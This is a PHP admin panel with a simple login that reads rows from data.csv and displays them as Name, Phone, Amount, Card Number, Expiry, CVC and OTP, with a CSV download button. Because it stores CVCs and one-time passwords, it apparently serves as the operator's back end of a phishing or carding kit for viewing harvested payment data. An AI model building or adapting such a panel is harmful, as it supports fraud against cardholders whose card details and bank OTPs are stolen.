<?php
// Fetch credentials from environment variables for improved security. Fall back to
// safe defaults if not provided. ADMIN_PASS_HASH should contain a password_hash()
// generated string.
$USER = getenv('ADMIN_USER') ?: 'admin';
$PASS_HASH = getenv('ADMIN_PASS_HASH') ?: password_hash('change_me', PASSWORD_DEFAULT);

session_start();
if (isset($_POST['user'], $_POST['pass'])) {
    if ($_POST['user'] === $USER && password_verify($_POST['pass'], $PASS_HASH)) {
        // Prevent session fixation
        session_regenerate_id(true);
        $_SESSION['logged'] = true;
    } else {
        echo '<div style="color:red;text-align:center;margin-top:20px;">Invalid login</div>';
    }
}
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: admin.php');
    exit;
}
if (!isset($_SESSION['logged'])) {
    echo '<div style="max-width:300px;margin:50px auto;padding:20px;border:1px solid #ccc;border-radius:8px;text-align:center;font-family:Arial;">
            <h3>Admin Login</h3>
            <form method="POST">
                <input name="user" placeholder="Username" style="width:100%;padding:8px;margin-bottom:10px;"><br>
                <input name="pass" type="password" placeholder="Password" style="width:100%;padding:8px;margin-bottom:10px;"><br>
                <button type="submit" style="padding:8px 16px;background:#333;color:#fff;border:none;border-radius:4px;">Login</button>
            </form>
          </div>';
    exit;
}
// Stream the CSV line-by-line to avoid loading large files fully into memory.
$file = __DIR__ . '/data.csv';
$data = [];
if (file_exists($file)) {
    $csv = new SplFileObject($file, 'r');
    $csv->setFlags(SplFileObject::READ_CSV);
    foreach ($csv as $row) {
        // Skip empty lines
        if ($row === [null] || $row === false) {
            continue;
        }
        $data[] = $row;
    }
}
echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Admin Panel</title>
<style>
body {font-family: Arial, sans-serif; margin: 20px; background: #f4f4f4;}
h2 {text-align:center;}
a.button {display:inline-block;margin:10px;padding:10px 20px;background:#007bff;color:#fff;text-decoration:none;border-radius:4px;}
a.button:hover {background:#0056b3;}
table {width:100%;border-collapse:collapse;background:#fff;margin-top:20px;}
th, td {border:1px solid #ddd;padding:10px;text-align:center;}
th {background:#007bff;color:white;}
tr:nth-child(even){background:#f2f2f2;}
</style></head><body>';

echo '<h2>Admin Panel</h2>';
echo '<div style="text-align:center;">';
echo '<a href="data.csv" class="button" download>Download CSV</a>';
echo '<a href="?logout=1" class="button" style="background:#dc3545;">Logout</a>';
echo '</div>';

echo '<table><tr>
        <th>Date</th><th>Phone</th><th>Amount</th>
        <th>Name</th><th>Card Number</th><th>Expiry</th><th>CVC</th><th>OTP</th></tr>';
foreach ($data as $row) {
    echo '<tr>';
    foreach ($row as $col) {
        echo '<td>' . htmlspecialchars($col) . '</td>';
    }
    echo '</tr>';
}
echo '</table></body></html>';
?>
